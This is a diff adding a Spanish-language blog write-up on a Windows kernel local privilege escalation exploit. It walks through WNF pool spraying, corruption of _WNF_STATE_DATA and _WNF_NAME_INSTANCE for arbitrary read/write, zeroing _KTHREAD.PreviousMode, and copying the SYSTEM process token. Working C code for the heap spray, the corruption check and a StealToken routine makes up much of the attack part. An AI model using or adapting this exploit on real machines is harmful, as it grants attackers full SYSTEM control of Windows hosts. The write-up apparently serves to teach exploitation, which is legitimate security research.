@@ -263,3 +263,196 @@ nt!_WNF_NAME_INSTANCE
 Estas estructuras son allocadas en el pool paginado por medio de las funciones NtCreateWnfStateName and NtUpdateWnfStateData, nesesitamos asignar estas dos estrcuturas y que nuestra memoria quede confirgurada de la siguiente manera:
 
 ![Configuracion de memoria](https://github.com/GabrielDurdiak/GabrielDurdiak.github.io/blob/master/images/NTFS%20CHUNK.png)
+
+
+Primero empezamos con la primera estructura que queremos que desborde que es _WNF_STATE_DATA, asignamos varias estructuras en el pool y liberamos otras con la funcion NtDeleteWnfStateData,luego como primera prueba para ver si  nuestra estructura _WNF_STATE_DATA fue corrompida cuando activamos la vulnerabilidad tenemos que ver el  ChangeStamp es 0xcafe  que ese valor fue puesto por nosotros para identificarlo.
+
+![Configuracion de memoria](https://decoded.avast.io/wp-content/uploads/sites/2/2022/01/wnf_state_data.png)
+
+Despues de que tengamos una corrupcion exitosa de _WNF_STATE_DATA necesitamos asignar la otra estrcutura que es _WNF_NAME_INSTANCE que quede adyacente a la estructura WNF_STATE_DATA como vimos en la imagen mas arriba.
+
+Antes expliquemos el porque corromper la estructura _WNF_STATE_DATA primero, es porque  el campo _WNF_STATE_DATA.AllocatedSize determina cuantos bytes se pueden escribir  y _WNF_STATE_DATA.DataSize determina cuantos bytes podemos leer  y al corromper estos campos con un valor alto nos proporciona una primitiva de lectura y escritura para escribir mas que el tamaño del buffe, con la funcion NtQueryWnfStateData podemos leer datos y con NtUpdateWnfStateData Podemos escribir datos.
+
+Ahora para detectar que a una estructura WNF_STATE_DATA le sigue la estructura nt!_WNF_NAME_INSTANCE debemos realizar una sobrelectura con la primitiva de lectura que nos dio WNF_STATE_DATA  y verificar los bytes  03 09 A8 que indican el incio de la estrcutra  WNF_NAME_INSTANCE.
+
+El codigo en el exploit nos queda de la siguiente manera, asi sprayeamos el pool:
+
+
+
+``` c
+
+
+int HeapSpray() {
+
+	NTSTATUS state = 0; 
+	PSECURITY_DESCRIPTOR pSD = nullptr; 
+	BYTE upData[0xa0] = { 0 }; 
+	RtlFillMemory(upData, sizeof(upData), 'C'); 
+
+	if (!ConvertStringSecurityDescriptorToSecurityDescriptor((LPCWSTR)"", SDDL_REVISION_1, &pSD, nullptr)) { 
+		return -1; 
+	}
+	for (int i = 0; i < 10000; i++) { 
+		state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, 0x1000, pSD); 
+		
+	
+		if (state != 0)
+		{
+			if (pSD)
+			{
+				LocalFree(pSD);
+				pSD = nullptr;
+			}
+
+			printf("Could not create WNF state name at index (%lld) with error (%lx).", i, state);
+			return false;
+		}
+	
+	}
+	for (int i = 1; i < 10000; i += 2) { 
+
+		state = NtDeleteWnfStateName(&StateNames[i]); 
+		if (state != 0) { 
+			return -1; 
+
+	}
+		StateNames[i].Data[0] = 0;
+		StateNames[i].Data[1] = 0;
+		state = NtUpdateWnfStateData((PWNF_STATE_NAME)&StateNames[i - 1], &upData, 0xa0, NULL, NULL, NULL, 0); 
+		
+		if (state != 0) { 
+			return -1; 
+		}
+	}
+
+	for (int i = 0; i < 10000; i += 4) {
+
+		NtDeleteWnfStateData(&StateNames[i], NULL);
+		NtDeleteWnfStateName(&StateNames[i]);
+
+		StateNames[i].Data[0] = 0;
+		StateNames[i].Data[1] = 0;
+
+	}
+
+
+}
+
+```
+
+Luego asi comprobamos que la memoria tenga las dos estructuras contiguas:
+
+``` c
+
+	state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
+			if (state == 0xc0000023) {
+
+				
+				ULONG Size = 0x1000;
+				NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &Size);
+				
+				PWNF_NAME_INSTANCE WnfIns = (PWNF_NAME_INSTANCE)(Buff + 0xa0 + 0x10);
+
+				if (WnfIns->Header.NodeByteSize == 0xa8 && WnfIns->Header.NodeTypeCode == 0x903 && WnfIns->RunRef.Ptr == NULL) {
+					printf("Struct WNF_STATE_NAME corrupted Found\n");
+					if (!FlipPreviuosMode(&StateNames[i], Buff)) {
+						printf("error FLipPreviousMode");
+					}
+
+
+```
+
+```c
+
+ if (WnfIns->Header.NodeByteSize == 0xa8 && WnfIns->Header.NodeTypeCode == 0x903 && WnfIns->RunRef.Ptr == NULL) 
+
+```
+En esta parte prueba que estemos ante un encabezado _WNF_NAME_INSTANCE.
+
+Pero antes de eso comprueba de que tengamos una estructura WNF_STATE_DATA corrompida
+
+``` c
+state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
+			if (state == 0xc0000023) 
+
+```
+
+Aca lo que sucede que la funcion  NtQueryWnfStateData lee datos y los almacena en  Buff y si el BufferSIze es menor que StateData→DataSize entonces nos devolvera un C0000023 que quiere decir que estamos antes un WNF_STATE_DATA corrompido.
+
+luego lo destacado que tiene la estructura  WNF_NAME_INSTANCE es el campo WNF_NAME_INSTANCE.CreatorProcess que nos da el EPROCESS del proceso actual.
+
+Otra cosa relevante que tiene  WNF_NAME_INSTANCE es el campo _WNF_NAME_INSTANCE.StateData. Que es un puntero a _WNF_STATE_DATA y si reemplazamos ese puntero por una direccion arbitraria podemos leer y escribir en dicha direccion.
+
+Esto nos podria perimitir usar la tecnica de Previus Mode para escalar privilegios, veamos como se hace:
+
+El puntero StateData se establece primero en _EPROCESS+0x28, lo que permite leer el campo _KPROCESS.ThreadListHead, Los ThreadListHead apunta a _KTHREAD.ThreadListEntry del primer hilo, que es el hilo actua ,al restar el desplazamiento de ThreadListEntry, se obtiene la direccion _KTHREAD base del hilo actual.
+
+Con la dirección base de _KTHREAD, el exploit apunta StateData a_KTHREAD+0x220, lo que le permite leer/escribir hasta tres bytes a partir de _KTHREAD+0x230, utiliza esto para establecer el byte _KTHREAD+0x232 en cero. el desplazamiento 0x232 corresponde a _KTHREAD.PreviousMode, ponemos  PreviousMode en cero y con lo que engañamos al kernel que algunas llamadas al sistema se originan en el kernel y nos permite usar las funciones NtReadVirtualMemoryy NtWriteVirtualMemory para poder hacer el robo de tokens y escalar privilegios.
+
+
+```c
+
+bool StealToken(UINT_PTR Eprocess, UINT_PTR* OldToken) {
+
+	char Buffer[0x1000] = { 0 };
+	UINT_PTR StartEprocess = Eprocess;
+	
+	UINT_PTR token = 0;
+
+	printf("[*]Starting token steal...\n");
+	
+	bool res=NtReadWrapper((UINT_PTR)(Eprocess + Token), OldToken, sizeof(*OldToken));
+	if (!res) {
+		printf("Error copy Backup Token\n");
+		return false;
+	}
+	do {
+		bool result = NtReadWrapper(StartEprocess, Buffer, sizeof(Buffer));
+
+		if (!result) {
+			printf("Error read Eprocess\n");
+			return false;
+		}
+
+		UINT_PTR UniqueProcId = 0;
+		result = NtReadWrapper((UINT_PTR)(StartEprocess + UniqueProcessId), &UniqueProcId, sizeof(UniqueProcId));
+
+		if (!result) {
+
+			printf("Error Read UniqueProcessId\n");
+			return false;
+		}
+
+		if (UniqueProcId == 4) {
+			
+			 result = NtReadWrapper((UINT_PTR)(StartEprocess + Token), &token, sizeof(token));
+			if (!result) {
+				printf("Error copy token\n");
+				return false;
+			}
+			break;
+
+		}
+		
+		StartEprocess = (UINT_PTR)(((_LIST_ENTRY*)(Buffer + ActiveProcessLinks))->Flink) - ActiveProcessLinks;
+
+	} while (StartEprocess != Eprocess);
+	
+	res = NtWriteWrapper((UINT_PTR)(Eprocess + Token), &token, sizeof(token));
+	if (!res) {
+		printf("Error copy System Process token\n");
+		return false;
+	}
+
+	printf("[*]Token copied successfully\n");
+	
+
+
+	return true;
+}
+
+```
+
+Demostracion:
+![Configuracion de memoria](https://github.com/GabrielDurdiak/GabrielDurdiak.github.io/blob/master/images/photo_5136685581147942004_y.jpg
+)
